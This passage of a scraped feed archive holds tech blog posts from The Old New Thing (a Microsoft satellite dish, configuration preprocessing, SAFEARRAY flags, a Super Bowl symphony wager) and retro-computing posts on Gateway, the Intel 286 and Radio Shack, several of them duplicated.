distribution to the Redmond campus. One purpose was to provide cable TV service for internal development and testing to teams like the Windows Media Center team and later the Xbox One team. \\n The satellite dish antenna was a Simulsat-5 which was capable of gathering signals from 35 satellites simultaneously. (The record during this particular antenna\u2019s lifetime was 26 simultaneous satellites.) It was a stationary antenna, not capable of changing its orientation. It went into service in 1997, was upgraded a few times, until it was finally decommissioned in 2017 when all of its tasks had been subsumed by a satellite dish antenna at the Studio C building. \\n Fun trivial about the satellite dish antenna: \\n In the summer, bees would nest in the feedbox (the thingie at focus of the satellite dish antenna that collected the signal), so you had to be careful when doing work there to avoid getting stung. \\n It wasn\u2019t fun in the winter either, because the enclosure for the electronic equipment (known as the \u201cdoghouse\u201d) would get filled with spiders who enjoyed the warmth from the equipment. \\n Snow had to be kept off the antenna for it to continue receiving signals, so whether or not Microsoft formally declared a snow closure, somebody had to remain on site to clear off the snow. \\n In 2007, there was a mystery to be solved: Occasionally, there would be interference that disrupted the signal. After some investigation, it was discovered that the source was electromagnetic interference generated by the pressure washers that were used to clean the parking lot. The water connection port was at the rear of Building 11, right near the satellite dish antenna. The solution was to do parking lot cleaning at night (when there was less demand for video signals), or if doing it during the day, to put the water pressure generators far away from the antenna. \\n My favorite piece of trivia is that in addition to being able to control the satellite dish antenna via the front panel, you could also control it over an RS-232 serial port. The serial line ran from the satellite dish to a Toshiba model 400CDT Satellite Pro (get it? Satellite pro?) running MS-DOS. Here\u2019s an archival photo, with some identifying stickers digitally erased. \\n \\xa0 \\n The post Some small stories about the giant satellite dish antenna that was behind Microsoft Building 11 appeared first on The Old New Thing . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:34</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Some%20small%20stories%20about%20the%20giant%20satellite%20dish%20antenna%20that%20was%20behind%20Microsoft%20Building%2011_20260205/","title":"Some small stories about the giant satellite dish antenna that was behind Microsoft Building 11","text":"<p>\u6765\u6e90: https://devblogs.microsoft.com/oldnewthing \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260203-00/?p=112035 \u65e5\u671f: Tue, 03 Feb 2026 15:00:00 +0000</p> <p>Back in the day, if you wandered into the parking area behind Building 11 on the original Redmond Microsoft campus, you would find a very large satellite dish antenna. This antenna was used for receiving video signals, such as cable television feeds for distribution to the Redmond campus. One purpose was to provide cable TV service for internal development and testing to teams like the Windows Media Center team and later the Xbox One team.</p> <p>The satellite dish antenna was a Simulsat-5 which was capable of gathering signals from 35 satellites simultaneously. (The record during this particular antenna's lifetime was 26 simultaneous satellites.) It was a stationary antenna, not capable of changing its orientation. It went into service in 1997, was upgraded a few times, until it was finally decommissioned in 2017 when all of its tasks had been subsumed by a satellite dish antenna at the Studio C building.</p> <p>Fun trivial about the satellite dish antenna:</p> <p>In the summer, bees would nest in the feedbox (the thingie at focus of the satellite dish antenna that collected the signal), so you had to be careful when doing work there to avoid getting stung.</p> <p>It wasn't fun in the winter either, because the enclosure for the electronic equipment (known as the \"doghouse\") would get filled with spiders who enjoyed the warmth from the equipment.</p> <p>Snow had to be kept off the antenna for it to continue receiving signals, so whether or not Microsoft formally declared a snow closure, somebody had to remain on site to clear off the snow.</p> <p>In 2007, there was a mystery to be solved: Occasionally, there would be interference that disrupted the signal. After some investigation, it was discovered that the source was electromagnetic interference generated by the pressure washers that were used to clean the parking lot. The water connection port was at the rear of Building 11, right near the satellite dish antenna. The solution was to do parking lot cleaning at night (when there was less demand for video signals), or if doing it during the day, to put the water pressure generators far away from the antenna.</p> <p>My favorite piece of trivia is that in addition to being able to control the satellite dish antenna via the front panel, you could also control it over an RS-232 serial port. The serial line ran from the satellite dish to a Toshiba model 400CDT Satellite Pro (get it? Satellite pro?) running MS-DOS. Here's an archival photo, with some identifying stickers digitally erased.</p> <p></p> <p>The post Some small stories about the giant satellite dish antenna that was behind Microsoft Building 11 appeared first on The Old New Thing.</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Studying%20compiler%20error%20messages%20closely-%20Input%20file%20paths_20260202/","title":"Studying compiler error messages closely: Input file paths","text":"<p>\u6765\u6e90: devblogs.microsoft.com/oldnewthing \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 15:00:00 +0000 \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260202-00/?p=112027</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' A colleague was working in a project that used a number of data files to configure how the program worked. They wanted one portion of the configuration file to be included only if a particular build flag was set. Let\u2019s say that the configuration file is C:\\repos\\contoso\\config\\Contoso.config . \\n \\n    \\n    \\n\\n    \\n    \\n\\n    \\n\\n \\n They were adding a build flag to convert the code base to use 2.0 widgets, but they wanted the default to be 1.0; only people who build with the special build flag should get 2.0 widgets. It so happens that 2.0 widgets depend on gadgets, so they also wanted to add a gadget provider, but again only conditionally based on the build flag. \\n The configuration file itself doesn\u2019t support conditionals. How can they get a configuration file to support conditionals when the file format does not support conditionals? \\n I suggested that they use a preprocessor to take the marked-up configuration file and produce a filtered output file, which becomes the actual configuration file. Upon closer investigation, it appeared that they were not the first project to need conditionals in their configuration file, and another team had already written a generic XML preprocessor that supports conditional elements based on build flags, and that other team even included instructions on their project wiki on how to include a preprocessor pass to their build configuration. The updated configuration file looks something like this: \\n \\n    \\n    \\n    \\n\\n \\n However, after following the instructions on the wiki to update the configuration file to use the condition attribute, and update the build process to send the file through the \u201cconditional build flags\u201d preprocessor, the was still a build error: \\n Validation failure: C:\\repos\\contoso\\config\\Contoso.config(2): Invalid attribute \\'condition\\'\\n \\n The configuration validator was upset at the condition attribute, but when they compared their project to other projects that used the configuration preprocessor, those other projects used the condition attribute just fine. \\n Look carefully at the error message. In particular, look at the path to the file that the validator is complaining about. \\n The validator is complaining about the original unprocessed file. \\n They went to the effort of sending the unprocessed file through the conditional build flags preprocessor to produce a processed file that has the correct provider list based on the build flags. But they forgot to use the results of that hard work: They were still using the old unprocessed file. It\u2019s like taking a photograph, doing digital touch-ups, but then uploading the original version instead of the touched-up version. \\n The fix was to update the project so that it consumed the processed file instead of the raw file.\u00b9 \\n Bonus chatter : To avoid this type of confusion, it is common to change the extension of the unprocessed file to emphasize that it needs to be preprocessed. That way, when you see an error in Contoso.config , you don\u2019t have to spend the effort to figure out which Contoso.config the error is about. \\n In this case, they could rename the unprocessed file to Contoso.preconfig and have the processed output be Contoso.config . I choose this pattern because the validator may require that the file extension be .config . \\n Another pattern would be to call the unprocessed version Contoso-raw.config and the processed version Contoso.config . \\n If you don\u2019t want to rename an existing file (say because you are worried about merge errors if your change collides with others who are also modifying that file), you could leave the unprocessed file as Contoso.config and call the processed file Contoso-final.config .\u00b2 \\n \u00b9 The instructions on the wiki says \u201cIn your project file, change references from yourfile.ext to $(OutputDirectory)\\yourfile.ext \u2018 But in this case, the file was being used not by the project file but by a separate configuration tool. The team was too focused on reading the literal instructions without trying to understand why the instructions were saying the things that they did. In this case, the instructions were focused on consumption from the project file, since that was the use case of the team that wrote the tool originally. But if you understand what the steps are trying to accomplish, you should realize that the intention is to update the references to the old yourfile.ext in every location you want to consume the postprocessed version.\u00b3 \\n \u00b2 I chose the suffix -final as a joking reference to the pattern of seeing files named Document-Final-Final-Final 2-USETHISONE.docx . \\n \u00b3 I took the liberty of updating the wiki to clarify that you need to update all references to yourfile.ext . The references usually come from the project file, but they could be in other places, too, such as a call to makepri.exe . \\n The post Studying compiler error messages closely: Input file paths appeared first on The Old New Thing . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:36</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Studying%20compiler%20error%20messages%20closely-%20Input%20file%20paths_20260205/","title":"Studying compiler error messages closely: Input file paths","text":"<p>\u6765\u6e90: https://devblogs.microsoft.com/oldnewthing \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260202-00/?p=112027 \u65e5\u671f: Mon, 02 Feb 2026 15:00:00 +0000</p> <p>A colleague was working in a project that used a number of data files to configure how the program worked. They wanted one portion of the configuration file to be included only if a particular build flag was set. Let's say that the configuration file is <code>C:\\repos\\contoso\\config\\Contoso.config</code>.</p> <pre><code>&lt;providers&gt;\n    &lt;!-- Widget version should be 1.0, or 2.0 if the useV2Widgets build flag is set --&gt;\n    &lt;provider name=\"Widget\" version=\"1.0\"/&gt;\n\n    &lt;!-- Gadget is needed only if the useV2Widgets build flag is set --&gt;\n    &lt;provider name=\"Gadget\" version=\"1.0\"/&gt;\n\n    &lt;!-- other providers that are used regardless of the build flags --&gt;\n&lt;/providers&gt;\n</code></pre> <p>They were adding a build flag to convert the code base to use 2.0 widgets, but they wanted the default to be 1.0; only people who build with the special build flag should get 2.0 widgets. It so happens that 2.0 widgets depend on gadgets, so they also wanted to add a gadget provider, but again only conditionally based on the build flag.</p> <p>The configuration file itself doesn't support conditionals. How can they get a configuration file to support conditionals when the file format does not support conditionals?</p> <p>I suggested that they  use a preprocessor to take the marked-up configuration file and produce a filtered output file, which becomes the actual configuration file. Upon closer investigation, it appeared that they were not the first project to need conditionals in their configuration file, and another team had already written a generic XML preprocessor that supports conditional elements based on build flags, and that other team even included instructions on their project wiki on how to include a preprocessor pass to their build configuration. The updated configuration file looks something like this:</p> <pre><code>&lt;providers&gt;\n    &lt;provider name=\"Widget\" version=\"1.0\" condition=\"!useV2Widgets\"/&gt;\n    &lt;provider name=\"Widget\" version=\"2.0\" condition=\"useV2Widgets\"/&gt;\n    &lt;provider name=\"Gadget\" version=\"1.0\" condition=\"useV2Widgets\"/&gt;\n&lt;/providers&gt;\n</code></pre> <p>However, after following the instructions on the wiki to update the configuration file to use the <code>condition</code> attribute, and update the build process to send the file through the \"conditional build flags\" preprocessor, the was still a build error:</p> <pre><code>Validation failure: C:\\repos\\contoso\\config\\Contoso.config(2): Invalid attribute 'condition'\n</code></pre> <p>The configuration validator was upset at the <code>condition</code> attribute, but when they compared their project to other projects that used the configuration preprocessor, those other projects used the <code>condition</code> attribute just fine.</p> <p>Look carefully at the error message. In particular, look at the path to the file that the validator is complaining about.</p> <p>The validator is complaining about the original unprocessed file.</p> <p>They went to the effort of sending the unprocessed file through the conditional build flags preprocessor to produce a processed file that has the correct provider list based on the build flags. But they forgot to use the results of that hard work: They were still using the old unprocessed file. It's like taking a photograph, doing digital touch-ups, but then uploading the original version instead of the touched-up version.</p> <p>The fix was to update the project so that it consumed the processed file instead of the raw file.\u00b9</p> <p>Bonus chatter : To avoid this type of confusion, it is common to change the extension of the unprocessed file to emphasize that it needs to be preprocessed. That way, when you see an error in <code>Contoso.config</code>, you don't have to spend the effort to figure out which <code>Contoso.config</code> the error is about.</p> <p>In this case, they could rename the unprocessed file to <code>Contoso.preconfig</code> and have the processed output be <code>Contoso.config</code>. I choose this pattern because the validator may require that the file extension be <code>.config</code>.</p> <p>Another pattern would be to call the unprocessed version <code>Contoso-raw.config</code> and the processed version <code>Contoso.config</code>.</p> <p>If you don't want to rename an existing file (say because you are worried about merge errors if your change collides with others who are also modifying that file), you could leave the unprocessed file as <code>Contoso.config</code> and call the processed file <code>Contoso-final.config</code>.\u00b2</p> <p>\u00b9 The instructions on the wiki says \"In your project file, change references from <code>yourfile.ext</code> to <code>$(OutputDirectory)\\yourfile.ext</code>' But in this case, the file was being used not by the project file but by a separate configuration tool. The team was too focused on reading the literal instructions without trying to understand why the instructions were saying the things that they did. In this case, the instructions were focused on consumption from the project file, since that was the use case of the team that wrote the tool originally. But if you understand what the steps are trying to accomplish, you should realize that the intention is to update the references to the old <code>yourfile.ext</code> in every location you want to consume the postprocessed version.\u00b3</p> <p>\u00b2 I chose the suffix <code>-final</code> as a joking reference to the pattern of seeing files named <code>Document-Final-Final-Final 2-USETHISONE.docx</code>.</p> <p>\u00b3 I took the liberty of updating the wiki to clarify that you need to update all references to <code>yourfile.ext</code>. The references usually come from the project file, but they could be in other places, too, such as a call to <code>makepri.exe</code>.</p> <p>The post Studying compiler error messages closely: Input file paths appeared first on The Old New Thing.</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Super%20Bowl%20LX%20creates%20an%20opportunity%20for%20symphonic%20friendly%20wagering_20260204/","title":"Super Bowl LX creates an opportunity for symphonic friendly wagering","text":"<p>\u6765\u6e90: devblogs.microsoft.com/oldnewthing \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 15:00:01 +0000 \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260204-01/?p=112039</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' This upcoming Sunday is Super Bowl LX, the championship game of the top professional American football league. The Super Bowl thinks that it is so important that it uses Roman numerals.) \\n The Super Bowl is the single largest sporting event in the United States. The entire country grinds to a halt when the game is on . If you aren\u2019t interested in the game, it\u2019s a great time to do public photography or run errands . \\n Traditionally, the mayors of the home cities of the two teams competing in the game make a friendly wager, with each mayor offering to send the other mayor some local products if their team loses. For example, in 2014, the mayors of Seattle and Denver wagered local foods and products as well as having to wear clothing inspired by the other team\u2019s city . \\n Sometimes other city organizations get into the friendly wagering spirit. In 2018, the Philadelphia Orchestra and Boston Symphony agreed that the losing city\u2019s conductor would have to wear the winning city\u2019s jersey at their next rehearsal . \\n But certainly we can do better than that. \\n The two teams competing in Super Bowl LX are the Seattle Seahawks and the New England Patriots (based near Boston). I think the Seattle Symphony and the Boston Symphony should engage in their own friendly wager: If the Seahawks win, then the Boston Symphony must play Erich Korngold\u2019s \u201cThe Sea Hawk\u201d at an upcoming concert. If the Patriots win, then the Seattle Symphony must play John Williams\u2019s \u201cThe Patriot\u201d. \\n The post Super Bowl LX creates an opportunity for symphonic friendly wagering appeared first on The Old New Thing . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:31</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Super%20Bowl%20LX%20creates%20an%20opportunity%20for%20symphonic%20friendly%20wagering_20260205/","title":"Super Bowl LX creates an opportunity for symphonic friendly wagering","text":"<p>\u6765\u6e90: https://devblogs.microsoft.com/oldnewthing \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260204-01/?p=112039 \u65e5\u671f: Wed, 04 Feb 2026 15:00:01 +0000</p> <p>This upcoming Sunday is Super Bowl LX, the championship game of the top professional  American football league. The Super Bowl thinks that it is so important that it uses Roman numerals.)</p> <p>The Super Bowl is the single largest sporting event in the United States.  The entire country grinds to a halt when the game is on. If you aren't interested in the game,  it's a great time to do public photography or run errands.</p> <p>Traditionally, the mayors of the home cities of the two teams competing in the game make a friendly wager, with each mayor offering to send the other mayor some local products if their team loses. For example, in 2014,  the mayors of Seattle and Denver wagered local foods and products as well as having to wear clothing inspired by the other team's city.</p> <p>Sometimes other city organizations get into the friendly wagering spirit. In 2018,  the Philadelphia Orchestra and Boston Symphony agreed that the losing city's conductor would have to wear the winning city's jersey at their next rehearsal.</p> <p>But certainly we can do better than that.</p> <p>The two teams competing in Super Bowl LX are the Seattle Seahawks and the New England Patriots (based near Boston). I think the Seattle Symphony and the Boston Symphony should engage in their own friendly wager: If the Seahawks win, then the Boston Symphony must play Erich Korngold's \"The Sea Hawk\" at an upcoming concert. If the Patriots win, then the Seattle Symphony must play John Williams's \"The Patriot\".</p> <p>The post Super Bowl LX creates an opportunity for symphonic friendly wagering appeared first on The Old New Thing.</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Why%20not%20store%20the%20SAFEARRAY%20reference%20count%20as%20a%20hidden%20allocation%20next%20to%20the%20SAFEARRAY-_20260130/","title":"Why not store the SAFEARRAY reference count as a hidden allocation next to the SAFEARRAY?","text":"<p>\u6765\u6e90: devblogs.microsoft.com/oldnewthing \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 15:00:00 +0000 \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260130-00/?p=112025</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' When I described how Safe\\xadArray\\xadAdd\\xadRef keeps its reference count in a side table , commenter Koro Unhallowed wondered why we couldn\u2019t store the reference count either before or after the formal SAFEARRAY structure . Commenter Peter Cooper Jr. suspected that there might be cases where applications assumed how much memory a SAFEARRAY occupied . \\n And indeed that is the case. \\n Not all SAFEARRAY s are created by the Safe\\xadArray\\xadCreate function. I\u2019ve seen code that declared and filled out their own SAFEARRAY structure. In those cases, the code allocates exactly sizeof(SAFEARRAY) bytes and doesn\u2019t allocate any bonus data for the reference count. \\n Indeed, there three flags in the fFeatures member for these \u201cbring your own SAFEARRAY \u201d structures. \\n \\n \\n \\n FADF_AUTO \\n An array that is allocated on the stack. \\n \\n \\n FADF_STATIC \\n An array that is statically allocated. \\n \\n \\n FADF_EMBEDDED \\n An array that is embedded in a structure. \\n \\n \\n \\n These flag indicate that the array was not created by Safe\\xadArray\\xadCreate but rather was constructed manually by the caller in various ways.\u00b9 \\n Note that if you pass a SAFEARRAY with one these flags to Safe\\xadArray\\xadAdd\\xadRef , it will still increment the reference count, but you don\u2019t get a data pointer back because the caller does not control the lifetime of the SAFEARRAY . The lifetime of the SAFEARRAY is controlled by the lifetime of the SAFEARRAY variable on the stack ( FADF_AUTO ), in the DLL\u2019s global data segment ( FADF_STATIC ), or in the enclosing object ( FADF_EMBEDDED ). \\n This means that our earlier suggestion to wrap the SAFEARRAY inside an in/out VARIANT runs into trouble if the SAFEARRAY is one of these types of arrays with externally-controlled lifetime. For those, you have no choice but to copy the data. \\n \u00b9 The documentation is, however, ambiguous about what \u201cthe array\u201d refers to. Is it referring to the SAFEARRAY structure itself? Or is it referring to the data pointed to by the pvData member? \\n The post Why not store the <code>SAFEARRAY</code> reference count as a hidden allocation next to the <code>SAFEARRAY</code>? appeared first on The Old New Thing . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:37</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Why%20not%20store%20the%20SAFEARRAY%20reference%20count%20as%20a%20hidden%20allocation%20next%20to%20the%20SAFEARRAY-_20260205/","title":"Why not store the SAFEARRAY reference count as a hidden allocation next to the SAFEARRAY?","text":"<p>\u6765\u6e90: https://devblogs.microsoft.com/oldnewthing \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260130-00/?p=112025 \u65e5\u671f: Fri, 30 Jan 2026 15:00:00 +0000</p> <p>When I described  how <code>Safe\u00adArray\u00adAdd\u00adRef</code> keeps its reference count in a side table, commenter Koro Unhallowed wondered  why we couldn't store the reference count either before or after the formal <code>SAFEARRAY</code> structure. Commenter Peter Cooper Jr. suspected that  there might be cases where applications assumed how much memory a <code>SAFEARRAY</code> occupied.</p> <p>And indeed that is the case.</p> <p>Not all <code>SAFEARRAY</code>s are created by the <code>Safe\u00adArray\u00adCreate</code> function. I've seen code that declared and filled out their own <code>SAFEARRAY</code> structure. In those cases, the code allocates exactly <code>sizeof(SAFEARRAY)</code> bytes and doesn't allocate any bonus data for the reference count.</p> <p>Indeed, there three flags  in the <code>fFeatures</code> member for these \"bring your own <code>SAFEARRAY</code>\" structures.</p> <code>FADF_AUTO</code> An array that is allocated on the stack. <code>FADF_STATIC</code> An array that is statically allocated. <code>FADF_EMBEDDED</code> An array that is embedded in a structure. <p>These flag indicate that the array was not created by <code>Safe\u00adArray\u00adCreate</code> but rather was constructed manually by the caller in various ways.\u00b9</p> <p>Note that if you pass a <code>SAFEARRAY</code> with one these flags to <code>Safe\u00adArray\u00adAdd\u00adRef</code>, it will still increment the reference count, but you don't get a data pointer back because the caller does not control the lifetime of the <code>SAFEARRAY</code>. The lifetime of the <code>SAFEARRAY</code> is controlled by the lifetime of the <code>SAFEARRAY</code> variable on the stack (<code>FADF_AUTO</code>), in the DLL's global data segment (<code>FADF_STATIC</code>), or in the enclosing object (<code>FADF_EMBEDDED</code>).</p> <p>This means that our earlier suggestion to wrap the <code>SAFEARRAY</code> inside an in/out <code>VARIANT</code> runs into trouble if the <code>SAFEARRAY</code> is one of these types of arrays with externally-controlled lifetime. For those, you have no choice but to copy the data.</p> <p>\u00b9 The documentation is, however, ambiguous about what \"the array\" refers to. Is it referring to the <code>SAFEARRAY</code> structure itself? Or is it referring to the data pointed to by the <code>pvData</code> member?</p> <p>The post Why not store the <code>SAFEARRAY</code> reference count as a hidden allocation next to the <code>SAFEARRAY</code>? appeared first on The Old New Thing.</p>"},{"location":"dfarq.homeip.net/","title":"dfarq.homeip.net","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Gateway announces merger with eMachines, 1-30-2004 20260129</li> <li>Intel 286 introduced Feb 2, 1982 20260202</li> <li>Radio Shack\u2019s 2015 bankruptcy 20260204</li> <li>What happened to Packard Bell- 20260130</li> <li>When Bill Gates claimed to work for $2 an hour 20260203</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"dfarq.homeip.net/Gateway%20announces%20merger%20with%20eMachines%2C%201-30-2004_20260129/","title":"Gateway announces merger with eMachines, 1/30/2004","text":"<p>\u6765\u6e90: dfarq.homeip.net \u53d1\u5e03\u65f6\u95f4: Thu, 29 Jan 2026 12:00:20 +0000 \u94fe\u63a5: https://dfarq.homeip.net/gateway-announces-merger-with-emachines-1-30-2004/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=gateway-announces-merger-with-emachines-1-30-2004</p> <p>Dave Farquhar Retro Computing January 29, 2026 January 29, 2026 3 Comments Twenty-one years ago, on January 30, 2004, Gateway announced it would be merging with eMachines. This brought two 90s computer brands together, but the tie-up didn\u2019t go all that well. Let\u2019s dig in and see what Gateway was thinking, and why it didn\u2019t work. Because, let\u2019s face it, who wouldn\u2019t have wanted a never obsolete PC in a cow-spotted box? Gateway merger rumors In 2004, Gateway paid $266 million for rival Emachines, hoping its management could find Gateway\u2019s former magic. Gateway was the subject of merger rumors throughout the 90s. It seemed like the industry\u2019s most eligible bachelor. Dell wanted to merge with them to eliminate its biggest and most successful direct-order competitor. Compaq wanted to merge with Gateway in order to better compete with Dell\u2019s direct-order model. I don\u2019t know how much of it was analyst talk or actual talk, but I heard rumors of an IBM tie-up early in the decade, for the same reason, to shore up IBM\u2019s flailing PC business and make it easier to compete with Dell. None of those mergers came to pass. Instead, Gateway did the acquiring. Even though they did it in a somewhat unconventional way. Reverse merger with Emachines Gateway bought Emachines in 2004 \u2013yes, the PCs of never obsolete infamy \u2013and put its management in charge, hoping the combination could cut costs and improve profitability. It wasn\u2019t Emachines who bought Gateway Computers. Gateway only made it look that way, and it was partly by design. Gateway wanted Emachines\u2019 management. But the combined company still struggled to compete against Acer, Dell, HP, and Lenovo. The experiment proved to be short lived. Gateway wanted Emachines for a simple reason. Emachines was profitable, Gateway wasn\u2019t. Emachines computers were cheaper than Gateways, and yet, they\u2019d found a way to be profitable. So Gateway paid $266 million in cash and stock to get Emachines\u2019 management. It\u2019s not hard to see why Emachines\u2019 management couldn\u2019t figure out how to turn around Gateway, however. Emachines sold a very simple lineup of machines, designed to hit specific price points. Gateway sold a broader lineup at retail, and they sold essentially custom PCs via direct order. Offering a limited menu is easier than offering a limitless one. It\u2019s easier to be profitable and it\u2019s easier to deliver consistent results. The experiment didn\u2019t work. Just over three and a half years later, on August 27, 2007, Acer bought Gateway for $710 million. What might have worked for Gateway and Emachines post merger Gateway\u2019s magic in the 90s was that they had Apple-like loyalty. I found it downright weird. But like Apple, Gateway found a way to sell an experience, and they found a sizeable audience that found that experience pleasant. It worked rather well, until enough competitors dragged Gateway into a price war. Gateway cut the experience as part of the cost-cutting, but the experience was what everyone wanted. One of the things Steve Jobs did to turn Apple around was to cut the number of products it offered. The selection of models was too confusing and it also made things more expensive to build. If Gateway had taken its cue from Emachines and reduced its product line to a smaller number of models and reinstated the old Gateway customer service and experience, that would have stood a better chance of working rather than trying to go head to head with Dell with a management staff that wasn\u2019t used to that model. Gateway could have even tried reviving its Gateway Country retail stores to provide something even closer to the Apple experience. If you found this post informative or helpful, please share it! share share save share share share pocket share email RSS feed Dave Farquhar David Farquhar is a computer security professional, entrepreneur, and author. He has written professionally about computers since 1991, so he was writing about retro computers when they were still new. He has been working in IT professionally since 1994 and has specialized in vulnerability management since 2013. He holds Security+ and CISSP certifications. Today he blogs five times a week, mostly about retro computers and retro gaming covering the time period from 1975 to 2000. Like this: Like Loading... Related stories by Dave Farquhar</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"dfarq.homeip.net/Intel%20286%20introduced%20Feb%202%2C%201982_20260202/","title":"Intel 286 introduced Feb 2, 1982","text":"<p>\u6765\u6e90: dfarq.homeip.net \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 12:00:17 +0000 \u94fe\u63a5: https://dfarq.homeip.net/intel-286-introduced-feb-2-1982/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=intel-286-introduced-feb-2-1982</p> <p>Dave Farquhar Retro Computing February 2, 2026 February 2, 2026 3 Comments The Intel 80286 (also marketed as the iAPX 286 and often called Intel 286) is a 16-bit microprocessor that was introduced on February 1, 1982 after about three years in development. It was the first 8086-based CPU with separate, non-multiplexed address and data buses and also the first with memory management and wide protection abilities. The 80286 used approximately 134,000 transistors and was nearly 100% backward compatible with the earlier Intel 8086 and 8088 processors. The Intel 286 in the IBM PC/AT The Intel 286 powered the IBM PC/AT and later compatibles. Major PC manufacturers were still selling 286-based PCs as late as March 1992. IBM decided in 1982 to use the 80286 in the IBM PC/AT , introduced in August 1984, skipping the Intel 186 . PC/AT compatible computers using the 80286 remained on the market until the early 1990s. By the end of 1988, Intel estimates there were around 15 million 286-based PCs in use worldwide. It took until 1987 to sell 5 million units, so it\u2019s not unreasonable to think by the time the big name brands stopped selling the 286 in early 1992, it may have reached a user base over 30 million. Intel\u2019s first 80286 chips ran at a maximum clockrate of 5, 6 or 8 MHz. Intel later released 10 and 12 MHz versions. AMD and Harris later produced 16 MHz, 20 MHz and 25 MHz parts, respectively. The CPU of the late 80s The 80286 wasn\u2019t supposed to dominate the late 80s. The Motorola 68000 family had a lot of hype in 1984 and 1985, and it looked like the Apple Macintosh , Atari ST, and Commodore Amiga had a bright future. Then in 1986, Intel released the 386, which was new and shiny and glamorous and 32 bit. But the 286 just sold and sold. The reason makes sense. In the mid 1980s, the 286 gave a reasonably high level of performance while being much less expensive than a 386. A 286 clock for clock was about twice as fast as an 8088-based machine. But a 386DX was not clock for clock twice as fast as a 286. So it was easier to justify paying extra to get a 286 over an XT than paying extra to get a 386 over a 286. It seemed like a better value. Although it seems hard to believe, the 386SX was in some cases a touch slower than a 286 at the same clock speed. That\u2019s because of the extra overhead of being 32 bits internally but only having a 16-bit data bus. The advantage of the 386SX was the ability to run 32-bit software and reach higher clock speeds than the 286 ever did. If you wanted to run Windows, the 386SX made sense. But a 286 made a better DOS machine. But until Windows really caught on, the 286 lived in something of a sweet spot performance wise. The July 23, 1990 issue of Computerworld stated the 286 had 35% of the computer market. The 386DX was close behind at 31%, 386SX at 11%, the 8088/8086 at 9%, and the 486 at less than 1 percent. The Motorola CPUs had 14% combined. Living in the 386\u2019s shadow\u2026 and outselling it We tend to assume the 286 went away quickly because of the 386, but the 286 had a long life on the market. As late as March 1992, Gateway 2000 was selling a 16 MHz 286 for $1345 vs a comparable (same specs all around) 16 MHz 386SX with Windows for $1445. A 25 MHz 386DX cost $1895. I remember Windows 3.0 killing interest in the 286 but after researching it, I think it was a false memory. It\u2019s more like it was Windows 3.1 that killed interest in the 286. If you found this post informative or helpful, please share it! share share save share share share pocket share email RSS feed Dave Farquhar David Farquhar is a computer security professional, entrepreneur, and author. He has written professionally about computers since 1991, so he was writing about retro computers when they were still new. He has been working in IT professionally since 1994 and has specialized in vulnerability management since 2013. He holds Security+ and CISSP certifications. Today he blogs five times a week, mostly about retro computers and retro gaming covering the time period from 1975 to 2000. Like this: Like Loading... Related stories by Dave Farquhar</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:54</p>"},{"location":"dfarq.homeip.net/Radio%20Shack%E2%80%99s%202015%20bankruptcy_20260204/","title":"Radio Shack\u2019s 2015 bankruptcy","text":"<p>\u6765\u6e90: dfarq.homeip.net \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 12:00:33 +0000 \u94fe\u63a5: https://dfarq.homeip.net/radio-shacks-2015-bankruptcy/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=radio-shacks-2015-bankruptcy</p> <p>Dave Farquhar Retro Computing February 4, 2026 February 4, 2026 4 Comments On February 5, 2015, Radio Shack filed for chapter 11 bankruptcy after posting losses 11 quarters in a row and accumulating $1.4 billion in debt. While not officially the end of Radio Shack, the Radio Shack that still exists today is a shadow of its pre-2015 self. At one time, Radio Shack was a retail giant, with about as many stores as McDonald\u2019s, with a high percentage of them in small towns. A small town was about as likely to have a Radio Shack as a McDonald\u2019s, and might not have both. We saw it coming Post-bankruptcy, Radio Shack emerged under new ownership circa 2016 and operated storefronts in partnership with Sprint. That only lasted about two years. There wasn\u2019t much surprise when Radio Shack filed chapter 11 bankruptcy in February 2015. Radio Shack had been declining since the 1990s. At its peak, Radio Shack had about 6,500 stores. By 2014, it was 2/3 that size, at closer to 4,300, but it was still too many stores for its business model at that time. Too many stores too close to each other Particularly in metropolitan areas, Radio Shack had too many stores too close to each other. Where I live, there were two Radio Shack locations about two and a half miles from each other in 2014. One was in a suburban strip mall in between a Sears Hardware store and a long defunct dollar store. The other was in a closed-air shopping mall near the entrance, between a USPS retail store and a Sears. In the 1980s and 1990s, both stores had enough traffic to justify their continued existence. The strip mall location moved at one point in the 1990s as the population around it shifted. Its previous location had been even closer to the mall. But as the 21st century entered its second decade, there were fewer and fewer reasons to go to Radio Shack. Having two 